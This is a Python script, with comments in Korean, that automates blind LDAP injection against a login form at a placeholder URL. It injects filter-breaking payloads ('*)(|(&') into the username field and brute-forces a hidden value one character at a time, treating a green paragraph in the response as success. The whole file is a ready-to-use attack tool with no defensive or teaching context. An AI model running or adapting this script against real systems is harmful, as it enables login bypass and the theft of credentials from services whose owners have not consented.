import requests
from bs4 import BeautifulSoup
import string
import time

# Blind LDAP Injection 자동화 스크립트
# 성공 조건 : 응답으로 P 태그의 색깔이 'green' 일 때

# Target URL
url = 'your_target_url'

# All Characters
char_set = string.ascii_lowercase + string.ascii_uppercase + string.digits + "._!@#$%^&*()"


successful_response_found = True
successful_chars = ''

headers = {
    'Content-Type': 'application/x-www-form-urlencoded'
}

while successful_response_found:
    successful_response_found = False

    for char in char_set:
        #print(f"Trying password character: {char}")

        # Payload
        data = {'username': f'{successful_chars}{char}*)(|(&','password': 'pwd)'}

        
        response = requests.post(url, data=data, headers=headers)

        # Parse HTML content
        soup = BeautifulSoup(response.content, 'html.parser')

        # 성공 조건
        paragraphs = soup.find_all('p', style='color: green;')

        if paragraphs:
            successful_response_found = True
            successful_chars += char
            print(f"Successful character found: {char}")
            break

    if not successful_response_found:
        print("No successful character found in this iteration.")

print(f"Final successful payload: {successful_chars}")